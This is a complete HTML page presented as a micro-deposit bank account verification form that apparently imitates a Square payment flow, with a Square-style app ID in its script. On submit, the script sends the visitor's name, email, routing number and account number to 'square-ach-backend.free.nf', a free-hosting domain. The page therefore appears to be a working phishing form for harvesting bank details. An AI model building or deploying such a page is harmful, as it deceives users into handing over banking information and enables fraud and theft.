<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Add Bank Account – Micro-Deposit</title>
  <style>
    body{font-family:Arial;max-width:520px;margin:40px auto;padding:20px;background:#f9f9f9;line-height:1.6}
    h2{color:#006241}
    input,button{width:100%;padding:14px;margin:10px 0;font-size:16px;border-radius:6px;border:1px solid #ccc}
    button{background:#006241;color:white;border:none;cursor:pointer;font-weight:bold}
    button:disabled{background:#999;cursor:not-allowed}
    .small{font-size:0.9em;color:#555;margin:20px 0}
    #status{margin-top:20px;padding:15px;border-radius:6px;display:none;font-weight:bold}
    .success{background:#d4edda;color:#155724}
    .error{background:#f8d7da;color:#721c24}
  </style>
</head>
<body>
  <h2>Add Bank Account (Micro-Deposit Verification)</h2>
  <p>We will send two small deposits (under $1) in 1–2 business days.</p>

  <form id="f">
    <input type="text" placeholder="Full Name" id="n" required>
    <input type="email" placeholder="Email" id="e" required>
    <input type="text" placeholder="Routing Number (9 digits)" id="r" maxlength="9" required>
    <input type="text" placeholder="Account Number" id="a" required>
    <div class="small">
      <label><input type="checkbox" id="c" required> I authorize micro-deposits and a small withdrawal</label>
    </div>
    <button type="submit" id="b" disabled>Send Micro-Deposits</button>
  </form>
  <div id="status"></div>

  <script>
    const APP_ID = 'sq0idp-IcmJ5BxnxnwPnIeE9i_leg';
    const LOCATION_ID = 'L719J7KASZKAV';

    document.getElementById('c').onchange = () => document.getElementById('b').disabled = !document.getElementById('c').checked;

    document.getElementById('f').onsubmit = async e => {
      e.preventDefault();
      document.getElementById('b').textContent = 'Sending…';
      const data = {
        name: document.getElementById('n').value,
        email: document.getElementById('e').value,
        routing: document.getElementById('r').value,
        account: document.getElementById('a').value
      };
      const r = await fetch('https://square-ach-backend.free.nf/add', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
      const j = await r.json();
      document.getElementById('status').style.display = 'block';
      document.getElementById('status').className = j.success?'success':'error';
      document.getElementById('status').textContent = j.success?'Micro-deposits sent! Check bank in 1–2 days':'Error: '+j.error;
    };
  </script>
</body>
</html>
